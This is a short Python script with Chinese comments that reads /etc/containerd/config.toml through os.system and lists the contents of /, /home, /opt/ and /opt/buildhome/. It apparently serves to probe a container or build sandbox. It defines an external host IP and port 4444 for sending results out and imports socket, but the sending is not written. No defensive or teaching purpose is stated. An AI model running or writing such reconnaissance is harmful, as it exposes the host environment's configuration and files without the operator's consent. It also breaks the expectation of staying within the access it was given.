import os
import socket
import subprocess

REMOTE_HOST = "172.237.65.250"   # 替换为你的外网主机IP
REMOTE_PORT = 4444       # 替换为你的服务器端口

def get_process_list():
    # 使用ps命令获取进程列表
    try:
        out = subprocess.check_output(['ps', 'aux'], text=True)
    except Exception as e:
        out = f"Error getting process list: {e}"
    return out

def get_root_file_list(p):
    # 获取根目录下的文件和目录列表
    try:
        files = os.listdir(p)
        files_str = '\n'.join(files)
    except Exception as e:
        files_str = f"Error getting root file list: {e}"
    return files_str

def main():
    # process_list = get_process_list()
    os.system("cat /etc/containerd/config.toml")
    
    ps = ["/", "/home", "/opt/", "/opt/buildhome/"]
    for p in ps:
        print(get_root_file_list(p))

if __name__ == "__main__":
    main()